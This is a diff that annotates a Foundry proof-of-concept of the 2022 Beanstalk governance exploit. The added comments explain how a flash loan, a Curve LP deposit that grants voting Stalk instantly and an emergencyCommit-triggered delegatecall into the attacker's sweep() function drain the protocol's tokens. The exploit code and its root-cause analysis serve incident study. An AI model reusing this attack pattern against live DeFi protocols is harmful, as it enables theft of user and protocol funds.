@@ -5,6 +5,42 @@ pragma solidity >=0.7.0 <0.9.0;
 import "forge-std/Test.sol";
 import "./../interface.sol";
 
+// VULNERABILITY: Governance Hijack via Flash-Loan Instant Stalk + Unrestricted Diamond Init Delegatecall
+// Root Cause:
+//   Beanstalk uses a Diamond proxy (EIP-2533) for its core logic at 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5.
+//   Governance is controlled by "Stalk" (and roots) which are credited INSTANTLY when a user calls
+//   depositBeans() or deposit(token, amount) on the SiloV2Facet (lines 40, 106 in exploit).
+//   There is no lockup, no vesting period, no minimum deposit time — Stalk is available for voting the same block.
+//   A passed BIP (Beanstalk Improvement Proposal) is executed via:
+//     beanstalkgov.emergencyCommit(bip)  --> internally invokes a diamondCut-like path with the BIP's
+//     stored (diamondCut, _init, _calldata)  [see IBeanStalk.propose + AppStorage.Governance.diamondCuts]
+//   When _diamondCut is empty (as here) and _init + _calldata are provided, the Diamond's fallback + LibDiamond.initializeDiamondCut
+//   performs: _init.delegatecall(_calldata)  IN THE CONTEXT OF THE DIAMOND (so address(this)==Diamond, full storage+balances).
+//   See:
+//     - sources/Diamond_C1E088/contracts_farm_Diamond.sol:46 (fallback delegatecall to facets)
+//     - sources/Diamond_C1E088/contracts_libraries_LibDiamond.sol:220 (_init.delegatecall(_calldata))
+//     - DiamondCutFacet:28 (but governance bypasses owner-only diamondCut by using BIP path)
+//     - AppStorage.sol:70 (Bip struct, Governance struct holding diamondCuts and bips)
+//   The flash loan (Aave ~1B stables) + Curve 3pool + bean3Crv metapool (0x3a70DfA7...) is used solely to
+//   manufacture a huge quantity of a "depositable" asset (the bean3crv LP token) that the Silo will accept,
+//   minting enough Stalk to control the vote and pass the emergencyCommit threshold for BIP#18.
+// Why it works:
+//   1. Silo accounting (Account.State.s.stalk / roots) is updated synchronously on deposit (no time-weighted or locked component).
+//   2. Propose() only needs a tiny amount of Stalk (seed 75 ETH->BEAN + depositBeans at L40).
+//   3. emergencyCommit can be called by anyone once the BIP's Stalk support threshold is met (here achieved post-flash).
+//   4. No sanity on _init (attacker contract) or restriction on what the delegatecall can do (arbitrary transfers of held assets).
+//   5. Beanstalk Diamond itself custodied large external reserves (3CRV, stables, etc. from prior raises/ops) + all user deposits.
+// Impact:
+//   Direct theft of all protocol-controlled ERC20 balances (in live exploit ~$182M). Here the PoC sweep only
+//   demonstrates reclaiming the flash-manufactured LP so the loan can be unwound profitably (net of Aave premium).
+//   Any holder of Stalk can be diluted or governance can be used for further malicious state changes.
+// References in PoC:
+//   - propose at L48
+//   - flash amounts at L70-76 (350M DAI + 500M USDC + 150M USDT)
+//   - LP deposit at L106
+//   - emergencyCommit at L110
+//   - sweep delegatecall target at L140
+
 contract ContractTest is Test {
     CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     ILendingPool aavelendingPool = ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
@@ -41,6 +77,9 @@ contract ContractTest is Test {
         emit log_named_uint(
             "After BEAN deposit to SiloV2Facet, Bean balance of attacker:", bean.balanceOf(address(this)) / 1e6
         );
+        // VULNERABILITY: Seed proposal with minimal Stalk (instant governance power)
+        // depositBeans immediately increases attacker's Stalk balance (see AppStorage.a[addr].s.stalk + roots).
+        // This Stalk is sufficient to call propose() even though it represents <<1% of total.
         IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);
         bytes memory data = abi.encodeWithSelector(ContractTest.sweep.selector);
         //emit log_named_uint("BIP:", bip);
@@ -52,6 +91,7 @@ contract ContractTest is Test {
         // )
         // https://dashboard.tenderly.co/tx/mainnet/0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f
         beanstalkgov.propose(_diamondCut, address(this), data, 3);
+        // The propose records the malicious (empty cut, _init=this, calldata=sweep) into Storage.Governance.diamondCuts[bip] / bips[bip].
 
         cheat.warp(block.timestamp + 24 * 60 * 60); //travelling 1 day in the future
 
@@ -66,6 +106,10 @@ contract ContractTest is Test {
         threeCrv.approve(address(bean3Crv_f), type(uint256).max);
         IERC20(address(bean3Crv_f)).approve(address(siloV2Facet), type(uint256).max);
 
+        // VULNERABILITY: Flash-loan + Curve LP mint to acquire temporary Stalk majority
+        // By borrowing 1B stables, the attacker mints a massive position in the Bean:3Crv metapool LP.
+        // This LP is an accepted silo deposit asset. The subsequent deposit() mints Stalk proportional to
+        // the deposited value, dwarfing all honest Stalk and satisfying the threshold for emergencyCommit.
         address[] memory assets = new address[](3);
         assets[0] = address(dai);
         assets[1] = address(usdc);
@@ -105,8 +149,16 @@ contract ContractTest is Test {
         emit log_named_uint(
             "After Curvebean3Crv_f balance of attacker:", IERC20(address(bean3Crv_f)).balanceOf(address(this))
         ); //@note logging balance for same token ?
+        // VULNERABILITY: Deposit of flash-manufactured LP grants instant controlling Stalk
+        // siloV2Facet.deposit(token, amount) transfers the LP into the Diamond and synchronously
+        // increases msg.sender's Stalk (and roots) in Account.State. No delay.
+        // Because this happens inside the Aave flashLoan callback (before repay), the capital is temporary.
         siloV2Facet.deposit(address(bean3Crv_f), IERC20(address(bean3Crv_f)).balanceOf(address(this)));
         //beanstalkgov.vote(bip); --> this line not needed, as beanstalkgov.propose() already votes for our bip
+        // VULNERABILITY: emergencyCommit executes attacker-chosen _init.delegatecall with protocol privileges
+        // At this point attacker controls enough Stalk that the BIP passes the emergency path.
+        // The governance facet reads the previously-proposed diamondCut/_init/_calldata and performs
+        // the equivalent of diamondCut, resulting in delegatecall(sweep) while storage context = Diamond.
         beanstalkgov.emergencyCommit(bip);
         emit log_named_uint(
             "After calling beanstalkgov.emergencyCommit() , bean3Crv_f balance of attacker:",
@@ -138,6 +190,17 @@ contract ContractTest is Test {
     }
 
     function sweep() external {
+        // VULNERABILITY: Arbitrary code execution payload executed via delegatecall in Diamond context
+        // When emergencyCommit triggers the BIP's init, this runs as:
+        //   (bool ok, ) = address(this /*Diamond*/).delegatecall( abi.encodeWithSelector(ContractTest.sweep.selector) );
+        // Therefore IERC20.balanceOf(address(this)) reads the *Diamond's* balance of the LP token
+        // (which received the attacker's flash deposit + any other protocol reserves of that token).
+        // The transfer moves those tokens to msg.sender (the original caller of emergencyCommit, i.e. attacker).
+        // In the real 2022-04 exploit the payload transferred every ERC20 held by the Diamond ( stables, BEAN, etc.).
+        // This is possible because:
+        //   - No access control inside sweep (anyone can call, but only reachable via gov path)
+        //   - delegatecall gives msg.sender + storage of the proxy
+        //   - No whitelist of allowed init addresses or calldata validation in the BIP execution path.
         IERC20 erc20bean3Crv_f = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
         erc20bean3Crv_f.transfer(msg.sender, erc20bean3Crv_f.balanceOf(address(this))); //Just for verification, so keep other tokens
     }
